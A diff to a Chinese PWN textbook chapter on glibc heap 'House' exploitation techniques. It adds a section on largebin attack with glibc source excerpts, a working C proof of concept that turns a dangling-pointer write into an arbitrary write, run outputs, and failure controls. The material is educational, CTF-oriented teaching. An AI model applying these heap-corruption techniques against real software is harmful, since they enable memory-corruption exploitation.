@@ -14,7 +14,7 @@ publish: true
 
 > [!info]- 章节信息
 > **所属方向**：PWN ｜ **难度阶段**：L3 堆上利用期 ｜ **前置要求**：[[P12-glibc堆管理机制|P12]] · [[P14-tcache与fastbin利用|P14]]
-> **本章目标**：把 House 系列的五个经典名字逐一讲透——每个按"核心思想 → 适用版本 → 哪个防御机制杀死了它 → 现代替代"四段式展开；2.43 上仍可行的（Spirit、Einherjar、Orange 前半）完整走到手，已死的（Force）在本机展示终止现场，并搭出 glibc 2.23 / 2.27 的历史环境把原始打法完整跑通作对照。
+> **本章目标**：把 House 系列的五个经典名字逐一讲透——每个按"核心思想 → 适用版本 → 哪个防御机制杀死了它 → 现代替代"四段式展开；2.43 上仍可行的（Spirit、Einherjar、Orange 前半）完整走到手，已死的（Force）在本机展示终止现场，并搭出 glibc 2.23 / 2.27 的历史环境把原始打法完整跑通作对照。House 家族之外，第 8 节补上常被并提的 largebin attack——unsorted bin attack 的现代后继。
 
 ## 1. House 系列：给历史技术建一套坐标系
 
@@ -38,7 +38,7 @@ publish: true
 | House of Orange | 改小 top 逼 sysmalloc 释放旧 top——没有 free 的 free | 前半仍可行；完整链死于 2.29（第 7 节） |
 
 > [!info]- 名字的由来
-> Malloc Des-Maleficarum（Phrack 57，2005）一篇命名了 House of Prime、Spirit、Force、Lore；House of Orange 因 HITCON CTF 2016 的一道同名赛题的题解得名；House of Einherjar 由 Kernelhacks 在 2016 年发表。此外还有一个不断扩大的家族：House of Apple 1/2/3（现代 FSOP 主力，[[P16-FSOP与HouseofApple2|P16]] 整章讲第 2 型）、House of Banana / House of Cat（ld.so 侧的结构）、House of Emma（exit 处理链的指针加密）等——它们的共同点是把"写一个结构体"当成攻击入口，与本章五个鼻祖同一血统，第 8 节有对照。
+> Malloc Des-Maleficarum（Phrack 57，2005）一篇命名了 House of Prime、Spirit、Force、Lore；House of Orange 因 HITCON CTF 2016 的一道同名赛题的题解得名；House of Einherjar 由 Kernelhacks 在 2016 年发表。此外还有一个不断扩大的家族：House of Apple 1/2/3（现代 FSOP 主力，[[P16-FSOP与HouseofApple2|P16]] 整章讲第 2 型）、House of Banana / House of Cat（ld.so 侧的结构）、House of Emma（exit 处理链的指针加密）等——它们的共同点是把"写一个结构体"当成攻击入口，与本章五个鼻祖同一血统，第 9 节有对照。
 
 版本口径沿用全书约定：主线按本机 glibc 2.43 讲解，行为差异集中在 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的对照表；fastbin 相关内容以 [[P14-tcache与fastbin利用#5. fastbin 利用：历史技术（glibc ≤ 2.40）|P14 第 5 节]]的历史环境为准。本章额外搭一套 glibc 2.23 / 2.27 的历史环境，让"已死"的技术把原始打法完整走一遍。
 
@@ -635,7 +635,213 @@ Orange 得名的原始战场在 2.23 时代：这套"旧 top 进 unsorted"只是
 
 前半程（7.2 的演示）在 2.43 上完整可用：无 free 约束下制造"旧 top 进 unsorted"，一次性拿到 libc 泄露 + 一个可再分配的大块。后半程的执行落点换成了现代打法：泄露到手之后走 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点决策，把伪造 FILE 挂进 `_IO_list_all`，触发与调用链完全按 [[P16-FSOP与HouseofApple2#5. House of Apple 2：借合法跳表拿 shell|P16 第 5 节]]的 House of Apple 2 打法执行——==Orange 负责"没有 free 也能有块、有泄露"，Apple 2 负责"有任意写之后的控制流"==，两章合起来就是原版 Orange 的现代等价物。
 
-## 8. 汇总：五个 House 的版本坐标系
+## 8. largebin attack：largebin 上的任意写
+
+### 8.1 它兑换的是什么
+
+House 系列之外，堆上还有一类"遍历写入"技术：不伪造块、不偷链表，而是==借分配器自己的一次指针写入，把一个值送进任意地址==。最老的一位是 unsorted bin attack——伪造 unsorted 块的 bk，让遍历把链表头（一个 libc 地址）写进任意位置；它在 2.29 被双向一致性检查杀死（7.3 从版本表推过结论）。它的后继就是本节的 **largebin attack**：借 largebin 的插入逻辑，==把被插入块的 chunk 地址（一个堆地址）写进任意目标==。
+
+两个技术写入的值都不是常数——==落点完全可控，写入值只能定性选择==，这决定了它们的用法：改"只需要一个大数或一个堆内地址"的字段，精确写值仍由 [[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]的 tcache poisoning 负责。两类原语的搭配见 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点决策。
+
+### 8.2 写入点：按"最小块"插入 largebin 的四行
+
+[[P12-glibc堆管理机制#3.3 largebin：按大小排序的双链|P12 3.3]]讲过 largebin 的双链加 nextsize 环。unsorted 遍历把大块搬进 largebin 时，插入逻辑分三种情况：bin 为空（nextsize 自环）、比当前最小块还小（绕过 nextsize 环直接挂到环尾）、其余（沿 nextsize 环找插入点）。写入点在第二种情况里——glibc 2.43 `_int_malloc` 的原文（变量名照抄源码，victim 是刚从 unsorted 取出的块）：
+
+```c
+/* fwd 指向 bin 链表头，bck->bk 是当前最小的块 */
+if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
+  {
+    fwd = bck;
+    bck = bck->bk;
+    if (__glibc_unlikely (fwd->fd->bk_nextsize->fd_nextsize != fwd->fd))
+      malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
+
+    victim->fd_nextsize = fwd->fd;
+    victim->bk_nextsize = fwd->fd->bk_nextsize;
+    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+  }
+```
+
+逐行读：`fwd->fd` 是 bin 里当前最小的块（记作 A）；第二行赋值把 ==A 的 bk_nextsize== 读进 victim；最后一行连等号的右半 `victim->bk_nextsize->fd_nextsize = victim` 解引用刚读来的值写入。==写入发生在刚插入的块身上，伪造却要下在先住进 bin 的 A 身上==——把 A 的 bk_nextsize 改成 `目标 − 0x20`，最后一行就把 victim 的 chunk 地址写进目标。fd_nextsize 在 chunk + 0x20、bk_nextsize 在 + 0x28（[[P12-glibc堆管理机制#2. chunk：管理器的账本|P12 第 2 节]]的字段布局），`目标 − 0x20` 正是让 fake 块的 fd_nextsize 槽落在目标上。
+
+写进赋值上方的核对（`fwd->fd->bk_nextsize->fd_nextsize != fwd->fd`）是 2.43 里真实生效的检查：它解引用伪造值，要求 fake 块的 fd_nextsize 指回 A。8.3 的演示用"预填"应付它，8.4 的对照组展示不预填的下场。
+
+### 8.3 完整演示（glibc 2.43）
+
+演示程序保留 free 之后的悬垂指针——真实题目里这就是 [[P13-基础堆漏洞|P13]] 的 UAF/edit 原语。布局与各步骤：
+
+| 步骤 | 动作 | 堆上的效果 |
+| ---- | ---- | ---- |
+| 铺垫 | `free(malloc(0x28))` | tcache 结构体提前诞生（它在本版本里第一次 free 才分配，[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
+| 布局 | A（chunk 0x450）、隔断、B（chunk 0x440）、隔断 | A、B 同一个 largebin 档（chunk 0x440–0x470 共用一档），A 大 B 小 |
+| 加工 | `free(a)` 后 `malloc(0x508)` | A 搬进 largebin，bin 内唯一：fd_nextsize、bk_nextsize 都是自环 |
+| 伪造 | `a[3] = &target − 0x20` | A 的 bk_nextsize 指向伪造成分 |
+| 预填 | `target = A 的 chunk 地址` | 应付插入路径的 fd_nextsize 核对 |
+| 触发 | `free(b)` 后 `malloc(0x508)` | B 比 A 小，走"最小块"插入——target 被写成 B 的 chunk 地址 |
+
+尺寸的选取各有原因：A、B 都要超出 tcache 小档的覆盖上限（chunk 0x410，[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]），free 才会直接进 unsorted；两块又要在同一档里且 A 大 B 小，插入才走"最小块"分支。
+
+```c
+/* lbattack.c —— largebin attack 演示（x86-64 Linux，glibc 2.43）
+ * 演示程序保留 free 后的悬垂指针（真实题里这就是 UAF/edit 原语）。
+ * 目标：把全局变量 target 改写成 B 的 chunk 地址（一个堆地址）。
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+unsigned long long target;    /* 任意写的落点 */
+
+int main(void) {
+    setbuf(stdout, NULL);
+
+    void *warm = malloc(0x28);
+    free(warm);                    /* tcache 结构体在第一次 free 时诞生 */
+
+    uint64_t *a = malloc(0x448);   /* A：chunk 0x450 */
+    malloc(0x38);                  /* 隔断：0x40 档，从 top 新切 */
+    uint64_t *b = malloc(0x438);   /* B：chunk 0x440，与 A 同 bin、更小 */
+    malloc(0x38);                  /* 隔开 top */
+    printf("a = %p（chunk %p）\nb = %p（chunk %p）\ntarget @ %p\n",
+           (void *)a, (void *)(a - 2), (void *)b, (void *)(b - 2), (void *)&target);
+
+    free(a);
+    malloc(0x508);                 /* 加工 unsorted：A 搬进 largebin（bin 内唯一，nextsize 自环） */
+    printf("[1] A 已进 largebin：a->fd = %#lx，a->bk_nextsize = %#lx（自环）\n", a[0], a[3]);
+
+    /* 漏洞原语：悬垂写，把 A 的 bk_nextsize 指向 target - 0x20 */
+    a[3] = (uint64_t)&target - 0x20;
+    /* 插入检查核对 fake->fd_nextsize == bin 内最小块：先在 target 预填 A 的 chunk 地址 */
+    target = (uint64_t)(a - 2);
+    printf("[2] a->bk_nextsize = %#lx，target 预填 = %#lx\n", a[3], target);
+
+    free(b);
+    malloc(0x508);                 /* B 按"bin 内最小块"插入：target 被写成 B 的 chunk 地址 */
+    printf("[3] target = %#llx\n", target);
+    if (target == (uint64_t)(b - 2))
+        puts("[4] LARGE BIN ATTACK：target 已被写成 B 的 chunk 地址");
+    return 0;
+}
+```
+
+```bash
+gcc -O0 -g -fno-pie -no-pie lbattack.c -o lbattack && ./lbattack
+```
+
+输出：
+
+```text
+a = 0x3e78f340（chunk 0x3e78f330）
+b = 0x3e78f7d0（chunk 0x3e78f7c0）
+target @ 0x404048
+[1] A 已进 largebin：a->fd = 0x7a95cd012ec8，a->bk_nextsize = 0x3e78f330（自环）
+[2] a->bk_nextsize = 0x404028，target 预填 = 0x3e78f330
+[3] target = 0x3e78f7c0
+[4] LARGE BIN ATTACK：target 已被写成 B 的 chunk 地址
+```
+
+逐步对照：`[1]` 里 A 的 fd 已指向 main_arena 内的 bin 链表头，bk_nextsize 是自环——bin 内唯一块的合法形态；`[2]` 把自环改成指向 `0x404028`（= target − 0x20），并在 target 预填 A 的 chunk 地址；`[3]` 里 target 从预填值变成 `0x3e78f7c0`——正是 `b − 0x10`，==B 的 chunk 地址被分配器亲手写进了任意位置==。
+
+预填这一步值得多说一句：插入核对要求 fake 块的 fd_nextsize 指回 A，而 fake 块的 fd_nextsize 槽恰好就是 target 自己——==预填的值会被攻击本身覆盖==，等于"用一次已知值的写，换一次任意值的写"。它依赖的只是"target 当前内容可控或可预测"，在 UAF 题里通常免费。
+
+### 8.4 布局前提：几个会提前引爆的坑
+
+每条布局前提都对应一种真实的死法，逐一列出：
+
+> [!warning] B 的 chunk 不能落在 tcache 小档覆盖内（≤ 0x410）
+> 落在内的话 free 直接进 tcache，unsorted 里根本没有 B，后面两步全部落空。A、B 选 0x450/0x440 而不是更常见的 0x420/0x410，就是因为后者有一块落进 tcache——同档（chunk 0x440–0x470 共用一档）里能同时满足"A 大 B 小、都超 0x410"的组合并不多。
+
+> [!warning] 隔断块不能复用 warm 让出的那一档
+> 演示开头 free 掉的 0x28 小块正躺在 `tcache[0x30]` 里，随后的 `malloc(0x28)` 若用作隔断，会把这块领回来——隔断落位到堆头，==A 与 B 直接相邻==。此时 free(B) 的后向合并发现"前一块还空着"（A 在 largebin 里就是空块），一路 `unlink_chunk(A)`——A 的 nextsize 环已被伪造，当场报 `corrupted double-linked list (not small)`。隔断换一个档位（如 0x38）从 top 新切即可。
+
+> [!warning] B 不能与 top 相邻
+> 道理同上：free 发现"下一块是 top"就直接并入 top，unsorted 里同样没有 B。最后一道隔断就是防这个。
+
+> [!info]- tcache 结构体的懒分配也可能来捣乱
+> [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]记过：tcache 结构体在第一次 free 时才分配。攻击途中若有某次 free 触发这次懒分配，那次 0x300 的请求会按最佳适配在各个 bin 里找块——largebin 里的 A（0x450）恰好装得下，==分配器会把伪造中的 A 摘出来交付==，unlink 核对当场终止进程。演示开头的 `free(malloc(0x28))` 就是把这次懒分配提前消化掉。
+
+不预填的下场，一枚对照实验（源码同 8.3，删掉预填那一行）：
+
+```bash
+gcc -O0 -g -fno-pie -no-pie lbnopreset.c -o lbnopreset && ./lbnopreset
+```
+
+输出：
+
+```text
+[1] A 已进 largebin：a->fd = 0x7099b9012ec8，a->bk_nextsize = 0x103f5330（自环）
+[2] a->bk_nextsize = 0x404028，target 预填 = 0
+malloc(): largebin double linked list corrupted (nextsize)
+```
+
+插入核对解引用伪造值、读到 0，与 bin 内最小块对不上，进程终止——==8.2 的检查真实生效，预填不是装饰==。
+
+### 8.5 版本条件：老的对照组与检查的年代
+
+unsorted bin attack 的死法，用同布局的对照实验当面看一遍（只伪造 unsorted 块的 bk）：
+
+```c
+/* lbunsorted.c —— 对照：unsorted bin attack（x86-64 Linux，glibc 2.43） */
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+unsigned long long target;
+
+int main(void) {
+    setbuf(stdout, NULL);
+
+    void *warm = malloc(0x28);
+    free(warm);
+
+    uint64_t *b = malloc(0x438);
+    malloc(0x38);                      /* 隔断 */
+    printf("b = %p（chunk %p）\ntarget @ %p\n",
+           (void *)b, (void *)(b - 2), (void *)&target);
+
+    free(b);
+    printf("[0] free 后：b->fd = %#lx，b->bk = %#lx\n", b[0], b[1]);
+    b[1] = (uint64_t)&target - 0x10;   /* 老打法：单处伪造 unsorted 块的 bk */
+    printf("[1] b->bk = %#lx（指向 target - 0x10）\n", b[1]);
+
+    malloc(0x508);                     /* 触发 unsorted 遍历 */
+    printf("[2] target = %#llx\n", target);
+    return 0;
+}
+```
+
+输出：
+
+```text
+b = 0x119d7340（chunk 0x119d7330）
+target @ 0x404040
+[0] free 后：b->fd = 0x700913412ac8，b->bk = 0x700913412ac8
+[1] b->bk = 0x404030（指向 target - 0x10）
+malloc(): unsorted double linked list corrupted
+```
+
+`[0]` 里 B 的 fd、bk 都指向 main_arena——它确实在 unsorted 链上；伪造 bk 后的第一次遍历，双向核对（`bck->fd != victim`）当场终止。把版本口径收进一张表：
+
+| 条件 | 2.27 | 2.43 | 依据 |
+| ---- | ---- | ---- | ---- |
+| unsorted 遍历的双向核对（`unsorted double linked list corrupted`） | 无 | 在场 | 7.3 的版本口径 ＋ 8.5 对照实验 ＋ 2.27 libc 的串比对 |
+| largebin 插入路径的 nextsize 核对（`(nextsize)`） | 无 | 在场 | 8.4 的不预填对照 ＋ 串比对 |
+| unlink 的 nextsize 环核对（`not small`） | 已有 | 在场 | 2.27 libc 同样有这串——极老 |
+| tcache 小档覆盖 0x20–0x410、结构体懒分配 | —（无 tcache） | 在场 | [[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]] |
+
+> [!info]- 把同一份源码放到 2.27 会怎样
+> 按第 2.2 节的历史环境跑到 2.27 上：unsorted 的双向核对与 largebin 插入路径的核对都缺席——unsorted bin attack 的写入（链表头地址进 target）会真实发生，largebin attack 的==预填一步可以省掉==。读老题解时看到"unsorted bin attack 一处伪造写任意地址""largebin attack 只需一次伪造"，就是这个年代的口径；在 2.43 上按本节的布局前提补齐即可。
+
+### 8.6 现代用途与落点
+
+写入值是"一个堆地址"决定了它的角色：==largebin attack 负责把堆内地址种进关键位置，精确控制仍由别的原语完成==。两个常用方向：
+
+- **"只需要变大/只需要非零"的字段**：堆地址是天文数字，拿去当尺寸、上限、计数一类的字段天然够用。老资料的经典落点 `mp_.tcache_bins`（把 tcache 表格上限改大）就属于这一类；
+- **结构指针类字段**：把"指向某结构的指针"改指到可控的堆上，让伪造结构摆在堆里——FSOP 的前置写入（[[P16-FSOP与HouseofApple2#5. House of Apple 2：借合法跳表拿 shell|P16 第 5 节]]）常从这里取料。
+
+做题时的选型顺序：手里若能直接 tcache poisoning（一处写加一次泄露，[[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]），优先它；编辑原语只够"改已 free 大块的字段"时，本节是把堆地址种进任意位置的现成通道，落点按 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的决策表选。
+
+## 9. 汇总：五个 House 的版本坐标系
 
 | House | 核心思想 | 原始适用版本 | 死因 / 现状 | 2.43 替代路径 |
 | ---- | ---- | ---- | ---- | ---- |
@@ -646,12 +852,12 @@ Orange 得名的原始战场在 2.23 时代：这套"旧 top 进 unsorted"只是
 | Orange | 缩 top 逼 sysmalloc 释放旧 top | 全系前半程 | 前半活着；完整链死于 2.29（unsorted attack） | 前半 + 泄露 → [[P16-FSOP与HouseofApple2\|P16]] Apple 2 |
 
 > [!note] 读老题解的换算法
-> "改 top size → 巨型 malloc"（Force）→ 2.43 直接作废，别再试；"smallbin bk 伪造"（Lore）→ 若题目只给一处写，直接换 tcache poisoning，五处写的账在第 5.4 节；"伪造块放 bss/栈"（Spirit 例外，Einherjar 不行）→ Einherjar 的合并块 size 会超过 system_mem，落点搬回堆内；"unsorted bin attack 写 `_IO_list_all`"→ 2.29 起作废，改走泄露 + tcache poisoning；"free 7 个装满 tcache / 第 8 个进 fastbin"→ [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的表。所有 House 的"思想层"都不随版本失效，失效的是布点与步长。
+> "改 top size → 巨型 malloc"（Force）→ 2.43 直接作废，别再试；"smallbin bk 伪造"（Lore）→ 若题目只给一处写，直接换 tcache poisoning，五处写的账在第 5.4 节；"伪造块放 bss/栈"（Spirit 例外，Einherjar 不行）→ Einherjar 的合并块 size 会超过 system_mem，落点搬回堆内；"unsorted bin attack 写 `_IO_list_all`"→ 2.29 起作废，改走泄露 + tcache poisoning 或第 8 节的 largebin attack；"free 7 个装满 tcache / 第 8 个进 fastbin"→ [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的表。所有 House 的"思想层"都不随版本失效，失效的是布点与步长。
 
 > [!info]- House 家族的其他成员（与后续章节的分工）
 > **House of Apple 1 / 2 / 3**：roderick01 的现代系列，借 stdio 的合法跳表完成任意写到控制流的兑换——第 2 型是 [[P16-FSOP与HouseofApple2|P16]] 的主线。**House of Banana / House of Cat**：攻击面移到 ld.so 的数据结构（`_rtld_global` 一族）与 exit 链，字段约束与 FILE 不同，入手点同样是"写一个结构体"。**House of Emma**：针对 exit 处理链的指针加密（[[P16-FSOP与HouseofApple2#1.2 任意分配之后，去哪找执行落点|P16 1.2]]的落点表里那行"加密的 exit handler"）构造伪造表项。它们的共同骨架与本章一致：==找一个"分配器/运行库会按字段解释的数据结构"，把字段的语义翻转成控制流==。掌握第 3 节到第 7 节的四段式读法，遇到新 House 按同一张清单拆即可。
 
-## 9. 常见问题
+## 10. 常见问题
 
 | 现象 | 原因与解决 |
 | ---- | ---- |
@@ -669,8 +875,11 @@ Orange 得名的原始战场在 2.23 时代：这套"旧 top 进 unsorted"只是
 | Orange 触发后报 sysmalloc 断言失败 | 伪造 size 没过三条件：按原始值减整页数（保留 PREV_INUSE）、old_end 保持页对齐（第 7.1 节） |
 | Orange 的旧 top 释放时报 `free(): invalid next size (normal)` | 旧 top 内部的 next 头是 0：用溢出原语把 top 内部填成 0x21 再改 size（第 7.1 节） |
 | Orange 的请求走了 mmap，什么都没发生 | 请求的 nb 超过 0x20000 阈值，sysmalloc 直接 mmap、不经过旧 top 释放路径（第 7.2 节）；缩减幅度调小 |
+| largebin attack 的 free(B) 报 `corrupted double-linked list (not small)` | 隔断被 tcache 领走，A、B 直接相邻，free(B) 的后向合并 unlink 了伪造过的 A：隔断换一个 tcache 档位（8.4） |
+| free(B) 后 unsorted 里没有 B | B 的 chunk 在 tcache 小档覆盖内（≤ 0x410），或紧邻 top 被直接并入：换档位、垫隔断（8.4） |
+| 插入时报 `malloc(): largebin double linked list corrupted (nextsize)` | 最小插入路径核对 fake 块的 fd_nextsize：预填 target = A 的 chunk 地址（8.2、8.3） |
 
-## 10. 配套练习与延伸阅读
+## 11. 配套练习与延伸阅读
 
 > [!note] 实战任务：五个 House 各打一题
 > 每题都按 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程|P1 第 2 节]]的五步流程走完整链，动笔前先在纸上写：这题的编辑原语喂给哪个 House、要伺候哪几条检查、2.43 上有没有替代路。
@@ -679,6 +888,7 @@ Orange 得名的原始战场在 2.23 时代：这套"旧 top 进 unsorted"只是
 > ③ **Lore**：把 how2heap 仓库的 house_of_lore 示例在本机 2.43 重写一遍，按第 5.4 节的账本数一遍写次数，再回答"为什么该题的官方解法是 poisoning"；
 > ④ **Einherjar**：挑一道 off-by-null 题，先按 [[P13-基础堆漏洞|P13]] 的重叠路线解一遍，再按本章第 6 节把合并起点搬到指定偏移，对比两条路线的条件清单；
 > ⑤ **Orange**：挑一道"只分配不释放"的堆题，把第 7.2 节的前半程做成 libc 泄露，后半接 [[P16-FSOP与HouseofApple2|P16]] 的 Apple 2 完成 getshell。
+> ⑥ **largebin attack**：把第 8 节演示的落点换成题目给定的全局字段，体会"写入值是堆地址"对落点选择的限制；再对照 [[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里|P14 第 8 节]]的落点表，说明什么场合该让位给 tcache poisoning。
 > how2heap 仓库（shellphish，GitHub）按攻击技术组织最小示例，多数基于旧版 glibc，跑之前先对 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的版本表换算。
 
 延伸阅读按用途分三档：
